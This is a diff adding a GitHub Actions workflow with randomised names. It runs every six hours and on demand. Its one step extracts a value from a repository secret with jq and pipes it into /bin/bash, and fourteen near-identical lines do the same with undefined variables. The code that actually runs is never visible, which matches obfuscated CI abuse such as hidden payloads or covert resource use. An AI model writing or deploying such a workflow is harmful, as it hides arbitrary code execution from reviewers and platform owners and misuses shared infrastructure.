@@ -1,0 +1,31 @@
+name: lihuangluan4378
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lihuangluan4378
+        env:
+          sky642: ${{ secrets.sky642 }}
+        run: |
+          echo $sky642 | jq -r .j471 | /bin/bash
+          echo $fjigz98 | jq -r .fj51516 | /bin/bash
+          echo $zpof4156 | jq -r .cb4715 | /bin/bash
+          echo $s16705 | jq -r .lim71 | /bin/bash
+          echo $kt19 | jq -r .rarx4 | /bin/bash
+          echo $kxi6500 | jq -r .ddh8 | /bin/bash
+          echo $or7 | jq -r .hqgcf6 | /bin/bash
+          echo $ezy640 | jq -r .pr59 | /bin/bash
+          echo $y33 | jq -r .bho62816 | /bin/bash
+          echo $s10632 | jq -r .egr2 | /bin/bash
+          echo $ogdum17 | jq -r .orwh11619 | /bin/bash
+          echo $bigdp1436 | jq -r .e195 | /bin/bash
+          echo $nster154 | jq -r .kwp8601 | /bin/bash
+          echo $t512 | jq -r .xsf8779 | /bin/bash
+          echo $sdj06962 | jq -r .qhzvk769 | /bin/bash
+
